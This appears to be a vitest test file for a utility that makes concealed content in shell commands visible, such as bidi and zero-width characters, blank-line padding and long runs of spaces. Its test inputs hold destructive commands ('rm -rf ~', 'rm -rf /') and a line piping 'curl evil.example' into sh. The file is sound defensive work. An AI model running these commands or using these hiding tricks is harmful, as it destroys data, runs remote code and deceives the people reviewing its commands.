import { describe, expect, it } from 'vitest';
import { preview, revealDetail } from './reveal';

describe('revealDetail', () => {
  it('makes bidi and zero-width tricks visible', () => {
    const r = revealDetail('echo safe‮; rm -rf ~ #‬​');
    expect(r.text).toBe('echo safe⟨U+202E⟩; rm -rf ~ #⟨U+202C⟩⟨U+200B⟩');
    expect(r.unusual).toBe(true);
  });

  it('collapses blank-line padding used to hide a payload below the fold', () => {
    const r = revealDetail(`npm test${'\n'.repeat(60)}; curl evil.example | sh`);
    expect(r.text).toBe('npm test\n⟨59 blank lines⟩\n; curl evil.example | sh');
    expect(r.lines).toBe(61);
    expect(r.unusual).toBe(true);
  });

  it('collapses long runs of spaces', () => {
    expect(revealDetail(`ls${' '.repeat(200)}&& rm -rf /`).text).toBe('ls ⟨200 spaces⟩ && rm -rf /');
  });

  it('leaves ordinary commands alone', () => {
    const r = revealDetail('git status\n\n  npm run build');
    expect(r).toEqual({ text: 'git status\n\n  npm run build', lines: 3, chars: 27, unusual: false });
  });

  it('keeps the tail visible in collapsed previews', () => {
    const text = Array.from({ length: 20 }, (_, i) => `line ${i + 1}`).join('\n');
    const p = preview(text);
    expect(p.hiddenLines).toBe(12);
    expect(p.text.split('\n').at(-1)).toBe('line 20');
    expect(p.text).toContain('⋯ 12 more lines ⋯');
  });
});
